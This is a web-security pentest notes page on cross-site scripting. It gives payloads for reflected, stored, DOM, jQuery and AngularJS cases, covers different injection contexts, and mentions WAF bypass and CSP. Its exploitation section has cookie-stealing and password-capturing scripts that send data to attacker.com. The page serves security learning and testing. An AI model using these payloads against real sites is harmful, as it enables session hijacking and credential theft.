---
title: "XSS"
weight: 29
description: "In-depth XSS pentest notes covering reflected, stored, & DOM-based types. Learn context-specific attacks, exploitation techniques, WAF bypass strategies, & CSP defenses."
---

# XSS

Cross-site scripting (XSS) works by manipulating a vulnerable web site so that it returns malicious JavaScript to users.

XSS cheatsheet: [PortSwigger XSS cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

More info about Javascript & obfuscation: [Javascript & Obfuscation]({{< ref "web/web-security/javascript-and-obfuscation" >}})

{{< hint style=warning >}}

**Warning**: Do not use `alert(1)` -> use `alert(document.domain)`.

```html
<textarea id="script" onchange=("unsafe(this.value)"></textarea><br>
<iframe id="result" sandbox="allow-scripts allow-modals"></iframe>
```

```javascript
document.session = "secret"
function unsafe(t) {
  var i = document.getElementById('result'); // get the <iframe>
  i.srcdoc = "<body><script>document.write("+t+");<"+"/script><body>";
}
```

* Try `alert(1)` and you see it works... but
* `alert(document.session)` won't work... why?
* `alert(window.origin)` or `alert(document.domain)` and you'll see it's empty
  * this is because the sandboxed iframe also has a different origin. It's isolated from the website it is embedded into and you cannot steal the secret session.
* Use `alert(document.domain)` or `alert(window.origin)` instead

{{< /hint >}}

{{< hint style=warning >}}

**Warning**: Do not use `<script>` tag -> use `<img>`.

If your target is using the innerHTML sink, the most common sink vulnerable to DOM XSS so your script might not work as expected. This is because innerHTML won't render a `<script>` tag \[[↗](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#security_considerations)]. However, if you use an `<img>` tag with an onerror attribute instead, the script will execute normally. 

Additionally, if the target sanitizes your payload using a library like DOMPurify, instead of simply encoding it, a `<script>` tag would be completely stripped out, leaving no visible trace. On the other hand, if you use an `<img>` tag, DOMPurify will remove the onerror attribute as expected, but the image itself will still be present. You will see the image load (or attempt to load) and the corresponding request in the logs, signaling that further investigation is needed.

{{< /hint >}}

---

## Reflected XSS

The malicious script comes from the current HTTP request.

```sh
https://insecure-website.com/search?term=<script>alert(document.domain)</script>
```

---

## Stored XSS

The malicious script comes from the website's database. POST body example:&#x20;

```sh
comment=<script>alert(document.domain)</script>
```

---

## DOM-based XSS

The vulnerability exists in client-side code rather than server-side code.

```html
<script>
function trackSearch(query) {
  document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
}
var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
  trackSearch(query);
}
</script>
```

```sh
# Get request 
https://insecure-website.com/index?search="><script>alert(document.domain)</script>
```

**Methodology**

1. Look for any script that has a sinks
2. See if you can control the sink
3. Exploit it

{{< hint style=tips >}}
**Tips**:

1.  Here there are some sources and sinks

    https://github.com/wisec/domxsswiki/wiki

    https://portswigger.net/web-security/cross-site-scripting/dom-based#which-sinks-can-lead-to-dom-xss-vulnerabilities
2. DOM Invader (Burp Suite tool) is a browser-based tool that helps you test for DOM XSS vulnerabilities using a variety of sources and sinks.
{{< /hint >}}

### DOM-based web message

```html
<!-- Vulnerable website -->
<script>
    window.addEventListener('message', function(e) {
        document.getElementById('test').innerHTML = e.data;
    })
</script>
```

Exploit

```html
<iframe src=https://vuln.website/ onload='this.contentWindow.postMessage("<img src=1 onerror=print()>","*")'>
```

### jQuery

jQuery's `attr()` function can change the attributes of DOM elements

```javascript
$(function() {
	$('#backLink').attr("href",(new URLSearchParams(window.location.search)).get('returnUrl'));
});
```

Exploit

```sh
?returnUrl=javascript:alert(document.domain)
```

***

jQuery's `$()` selector function in another potential sink. If you open the browser console and type `$('<img src=x onerror=alert()>')` jQuery creates this new element (so the alert will be shown)

An example:

```javascript
$(window).on('hashchange', function() {
	var element = $(location.hash);
	element[0].scrollIntoView();
});
```

Exploit

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```

{{< hint style=notes >}}
**Note**: Recent versions of jQuery have patched this specific vulnerability by preventing HTML injection into a selector if the input begins with a hash (#). But remember, this is just an example, the real problem is how `$()` selector works .
{{< /hint >}}

### AngularJS

When a site uses the `ng-app` attribute on an HTML element, AngularJS processes it and executes JavaScript inside double curly braces `{{ }}` in HTML or attributes.

Consider

```sh
https://example.com/?search=test
```

```html
<body ng-app>
<!-- something -->
<h1>0 search results for 'test'</h1>
<!-- something -->
</body>
```

**Test**

```sh
https://example.com/?search=%7B%7B1%2B1%7D%7D # ?search={{1+1}}
```

```html
<body ng-app>
<!-- something -->
<h1>0 search results for '2'</h1>
<!-- something -->
</body>
```

**Exploit**

```sh
https://example.comnet/?search=%7B%7B%24on.constructor%28%27alert%281%29%27%29%28%29%7D%7D
# ?search={{$on.constructor('alert(1)')()}}
```

```html
<body ng-app>
<!-- something -->
<h1>0 search results for ''</h1>
<!-- something -->
</body>
```

### Reflected/Stored DOM XSS

If a script reads data from a URL and writes it to a dangerous sink, the vulnerability is client-side with no server processing.

* **Reflected DOM** vulnerabilities happen when the server processes and echoes data from a request, and a script on the page handles this data unsafely, writing it to a dangerous sink.

```javascript
eval('var data = "reflected string"');
```

* In a **stored DOM XSS** vulnerability, the server stores data from one request and includes it in a later response. A script in the later response processes this data unsafely in a sink.

```javascript
element.innerHTML = comment.author
```

---

## XSS contexts

### Between HTML tags

```html
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```

{{< hint style=notes >}}
**Note**: understand how a payload works

* `<body onresize="print()">` with this payload (for reflected XSS) you need an exploit server and iframe tag
{{< /hint >}}

### In HTML tag attributes

* Terminate the attribute value, close the tag, and introduce a new one.

    ```html
    "><script>alert(document.domain)</script>
    ```

* If angle brackets are blocked or encoded, introduce a new attribute that creates a scriptable context.

    ```html
    " autofocus onfocus=alert(document.domain) x="
    ```

* If XSS context is into the href attribute of an anchor tag, use the javascript pseudo-protocol to execute script

    ```html
    <a href="javascript:alert(document.domain)">
    ```

* Access keys allow you to provide keyboard shortcuts that reference a specific element. This is useful in hidden inputs because events like onmouseover and onfocus can't be triggered due to the element being invisible

    ```html
    <input type="hidden" accesskey="X" onclick="alert(1)">
    ```

    ```html
    <link rel="canonical" accesskey="X" onclick="alert(1)" />
    ```

   {{< hint style=notes >}}
   **Tips**:

   * Substitute `'` `"` and vice versa
   * Space is not needed

   ```html
   <link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>
   ```
   {{< /hint >}}

    ```html
    <link rel="canonical" href='https://website.net/?'accesskey='X'onclick='alert(1)'/>
    ```

### Into JavaScript

**Terminating the existing script**

The browser interprets the `</script>` sequence within the string as the end of the script block, prematurely stopping the execution of your JavaScript script and generating an error.

```html
<script>
...
var input = 'controllable data here';
...
</script>
```

```html
<!-- Payload -->
</script><img src=1 onerror=alert(document.domain)>
```

***

**Breaking out of a JavaScript string**

* It's essential to repair the script following the XSS context, because any syntax errors there will prevent the whole script from executing

    ```javascript
    '-alert(document.domain)-'
    ';alert(document.domain)//
    ```

* Some applications try to escape single quote characters with a backslash but often forget to escape the backslash itself.
  * `';alert(document.domain)//` is converted to `\';alert(document.domain)//`&#x20;
  * so your input could be `\';alert(document.domain)//` which gets converted to `\\';alert(document.domain)//`
* Making use of HTML-encoding
  * When the XSS context is some existing JavaScript within a quoted tag attribute, such as an event handler, it is possible to make use of HTML-encoding to work around input filters.
    * `<a href="#" onclick="... var input='controllable data here'; ...">`
    * `&apos;-alert(document.domain)-&apos;`
    * The browser HTML-decodes the value of the onclick attribute before the JavaScript is interpreted
    * HTML encode: https://html.spec.whatwg.org/multipage/named-characters.html

   {{< hint style=notes >}}
   **Note**: you cannot use `&quot;` -> `"` to close onclick attribute. Remember: The browser HTML-decode the value of the onlick attribute but not the entire structure
   {{< /hint >}}

* XSS in JavaScript template literals
  * JavaScript template literals are string literals that allow embedded JavaScript expressions (Template literals are encapsulated in backticks)

    ```html
    <script>
    ...
    var input = `controllable data here`;
    ...
    </script>
    ${alert(document.domain)}
    ```

---

## Bypass WAF

If you receive an error like "tag is not allowed" or "event is not allowed", use XSS cheat sheet ([https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)) to discover a tag and event that work.

---

## Exploitation

### Steal cookies
```html
<script>fetch('//attacker.com?'+document.cookie)</script>
<!-- or -->
<script>location='//attacker.com?'?+document.cookie</script>
```

```html
<script>
fetch('https://attacker.com', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```

Limitation:

* The victim might not be logged in.
* Many applications hide their cookies from JavaScript using the `HttpOnly` flag.
* Sessions might be locked to additional factors like the user's IP address.
* The session might time out before you're able to hijack it.

### Capture passwords

```html
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://attacker.com',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```

### Perform CSRF

* When CSRF occurs as a standalone vulnerability, it can be patched using strategies like anti-CSRF tokens. However, these strategies do not provide any protection if an XSS vulnerability is also present.
* If the site use a token you can get it doing a first request and then add the token in a second request

---

## Content security policy

CSP restrict the resources (such as scripts and images) that a page can load and restricting whether a page can be framed by other pages. CSP defends against XSS attacks in the following ways

* Restricting Inline Scripts
  * `<script>document.body.innerHTML='defaced'</script>` will not work
* Restricting Remote Scripts
  * `<script src="https://evil.com/hacked.js"></script>` will not work
* Restricting Unsafe JavaScript
* Others [https://cheatsheetseries.owasp.org/cheatsheets/Content\_Security\_Policy\_Cheat\_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html)

---

## Compress & minify JavaScript

You can compress and minify your JS by using tools like [JSCompress](https://jscompress.com/).